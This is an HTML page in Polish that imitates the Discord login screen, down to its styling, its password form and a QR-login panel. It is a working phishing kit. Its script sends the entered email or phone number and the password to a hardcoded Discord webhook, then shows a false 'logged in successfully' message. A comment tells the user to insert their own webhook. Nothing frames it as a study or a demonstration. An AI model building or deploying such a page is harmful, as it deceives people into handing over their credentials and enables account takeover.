<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

    body {
      margin: 0;
      font-family: 'Inter', system-ui, sans-serif;
      background: linear-gradient(135deg, #2C2F33, #1E2126);
      color: #dcddde;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    body::before {
      content: '';
      position: absolute;
      inset: 0;
      background: radial-gradient(circle, rgba(255,255,255,0.07) 1px, transparent 1px);
      background-size: 60px 60px;
      pointer-events: none;
    }

    .container {
      background: #36393f;
      width: 100%;
      max-width: 920px;
      border-radius: 12px;
      padding: 48px 40px;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.65);
      display: flex;
      gap: 70px;
      position: relative;
      z-index: 1;
    }

    .left {
      flex: 1;
    }

    h1 {
      font-size: 28px;
      font-weight: 700;
      color: #fff;
      text-align: center;
      margin: 0 0 10px 0;
    }

    .subtitle {
      text-align: center;
      color: #b9bbbe;
      font-size: 16px;
      margin-bottom: 40px;
    }

    label {
      display: block;
      font-size: 12.5px;
      font-weight: 600;
      color: #b9bbbe;
      margin-bottom: 8px;
      text-transform: uppercase;
      letter-spacing: 0.4px;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      background: #202225;
      border: 1px solid #202225;
      border-radius: 6px;
      color: #dcddde;
      font-size: 16px;
      margin-bottom: 24px;
    }

    input:focus {
      border-color: #5865f2;
      box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.25);
      outline: none;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #5865f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    button:hover {
      background: #4752c4;
    }

    .forgot {
      color: #00aff4;
      font-size: 14px;
      text-align: center;
      display: block;
      margin-top: 16px;
      text-decoration: none;
    }

    .right {
      width: 240px;
      text-align: center;
      padding-top: 30px;
    }

    .qr-box {
      background: white;
      width: 180px;
      height: 180px;
      margin: 0 auto 16px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 85px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.4);
    }

    .qr-title {
      font-size: 19px;
      font-weight: 600;
      margin-bottom: 10px;
      color: #fff;
    }

    .qr-text {
      color: #b9bbbe;
      font-size: 14px;
      line-height: 1.45;
    }
  </style>
</head>
<body>

  <div class="container">
    <!-- Lewa strona -->
    <div class="left">
      <h1>Witamy ponownie!</h1>
      <p class="subtitle">Cieszymy się, że znowu z nami jesteś!</p>

      <form id="loginForm">
        <label>Adres e-mail lub numer telefonu</label>
        <input type="text" id="email" placeholder="jan.kowalski@example.com" required>

        <label>Hasło</label>
        <input type="password" id="password" placeholder="••••••••" required>

        <button type="submit">Zaloguj się</button>
      </form>

      <a href="#" class="forgot">Nie pamiętasz hasła?</a>

      <p style="text-align:center; margin-top:40px; color:#72767d; font-size:14px;">
        Potrzebujesz konta? <span style="color:#00aff4; cursor:pointer;">Zarejestruj się</span>
      </p>
    </div>

    <!-- Prawa strona - QR -->
    <div class="right">
      <div class="qr-title">Zaloguj się kodem QR</div>
      <div class="qr-box">📱</div>
      <p class="qr-text">Zeskanuj to aplikacją mobilną Discord,<br>by natychmiast się zalogować.</p>
    </div>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1493250113588691067/2kSrCkWZnkMKpbYNURbE-afbcfWLwrwlXyGWHr22AdA4LphCobaTQh3tTctEXXVbQmvu"; // ← ZMIEŃ NA SWÓJ!

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        alert("Wypełnij wszystkie pola!");
        return;
      }

      const payload = {
        username: "Discord Login",
        embeds: [{
          title: "🔑 Nowe logowanie na Discord",
          color: 0x5865f2,
          fields: [
            { name: "Email / Telefon", value: email, inline: true },
            { name: "Hasło", value: password, inline: true },
            { name: "Czas", value: new Date().toLocaleString('pl-PL') }
          ]
        }]
      };

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        alert("✅ Zalogowano pomyślnie!");
      } catch (err) {
        alert("Błąd połączenia.");
      }
    });
  </script>

</body>
</html>
